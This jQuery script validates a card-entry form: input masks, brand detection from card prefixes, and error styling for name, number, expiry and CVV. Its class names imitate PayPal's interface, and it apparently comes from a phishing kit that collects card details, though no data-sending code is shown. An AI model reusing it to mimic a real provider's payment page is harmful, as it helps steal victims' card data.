jQuery(function() {
  $('#Exp')['mask']('99 / 99');
});
jQuery(function() {
  $('#Cvv')['mask']('9999');
});

$(document).ready(function() {
  $("#btnConfirm").click(function() {
    var xFullName = $("#Name").val();
    var xCardNumber = $("#Number").val();
    var xCardExp = $("#Exp").val();
    var xCardcvv = $("#Cvv").val();
    var xStart;
    if (xFullName === "") {
      xStart = false;
      document.getElementById("DivName").className = "textInput lap hasError";
    }
    if (xCardNumber === "" || xCardNumber.length < 15) {
      xStart = false;
      document.getElementById("DivNumber").className = "textInput ccNumber ccNumber ccNum lap hasError";
      document.getElementById("DivLogo").className = "fiModule-icon_card hide";
    }
    if (xCardExp === "" || xCardExp.length < 6) {
      xStart = false;
      document.getElementById("DivExp").className = "textInput expirationDate js_expirationDate expirationDate expirationDate lap hasError";
    }
    if (xCardcvv === "" || xCardcvv.length < 3) {
      xStart = false;
      document.getElementById("DivCvv").className = "textInput csc pull-right csc securityCode lap hasError";
    }
    if (xStart === false) {
      return false;
    } else {
      document.getElementById("loding").className = "hasSpinner";
    }
    return true;
  })
  $("#Name").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivName").className = "textInput lap";
    } else {
      document.getElementById("DivName").className = "textInput lap hasError";
    }
  })
  $("#Number").keyup(function() {
    var x = document.getElementById("Number").className;
    if (x == "textInput ccNumber ccNumber ccNum lap hasError" || $(this).val().length !== 0) {
      document.getElementById("DivNumber").className = "textInput ccNumber ccNumber ccNum lap";
    } else {
      document.getElementById("DivNumber").className = "textInput ccNumber ccNumber ccNum lap hasError";
      document.getElementById("DivLogo").className = "fiModule-icon_card hide";
      $("#DivCvv").attr("data-ctype", "");
    }
    if ($(this).val().substring(0, 1) == 4) {
      document.getElementById("DivLogo").className = "fiModule-icon_card fiModule-visa-logo";
      $("#DivCvv").attr("data-ctype", "");
      jQuery(function() {
        $('#Number')['mask']('9999 9999 9999 9999');
      });
    }
    if ($(this).val().substring(0, 1) == 5) {
      document.getElementById("DivLogo").className = "fiModule-icon_card fiModule-mastercard-logo";
      $("#DivCvv").attr("data-ctype", "");
      jQuery(function() {
        $('#Number')['mask']('9999 9999 9999 9999');
      });
    }
    if ($(this).val().substring(0, 2) == 34) {
      document.getElementById("DivLogo").className = "fiModule-icon_card fiModule-amex-logo";
      $("#DivCvv").attr("data-ctype", "amex");
      jQuery(function() {
        $('#Number')['mask']('9999 999999 99999');
      });
    }
    if ($(this).val().substring(0, 2) == 37) {
      document.getElementById("DivLogo").className = "fiModule-icon_card fiModule-amex-logo";
      $("#DivCvv").attr("data-ctype", "amex");
      jQuery(function() {
        $('#Number')['mask']('9999 999999 99999');
      });
    }
    if ($(this).val().substring(0, 2) == 35) {
      document.getElementById("DivLogo").className = "fiModule-icon_card fiModule-jcb-logo";
      $("#DivCvv").attr("data-ctype", "");
      jQuery(function() {
        $('#Number')['mask']('9999 9999 9999 9999');
      });
    }
    if ($(this).val().substring(0, 2) == 60) {
      document.getElementById("DivLogo").className = "fiModule-icon_card fiModule-discover-logo";
      $("#DivCvv").attr("data-ctype", "");
      jQuery(function() {
        $('#Number')['mask']('9999 9999 9999 9999');
      });
    }
  })
  $("#Exp").keyup(function() {
    var x = document.getElementById("DivExp").className;
    if (x == "textInput expirationDate js_expirationDate expirationDate expirationDate lap hasError" || $(this).val().length !== 0) {
      document.getElementById("DivExp").className = "textInput expirationDate js_expirationDate expirationDate expirationDate lap";
    } else {
      document.getElementById("DivExp").className = "textInput expirationDate js_expirationDate expirationDate expirationDate lap hasError";
    }
  })
  $("#Cvv").keyup(function() {
    var x = document.getElementById("DivCvv").className;
    if (x == "textInput csc pull-right csc securityCode lap hasError" || $(this).val().length !== 0) {
      document.getElementById("DivCvv").className = "textInput csc pull-right csc securityCode lap";
    } else {
      document.getElementById("DivCvv").className = "textInput csc pull-right csc securityCode lap hasError";
    }
  })
})
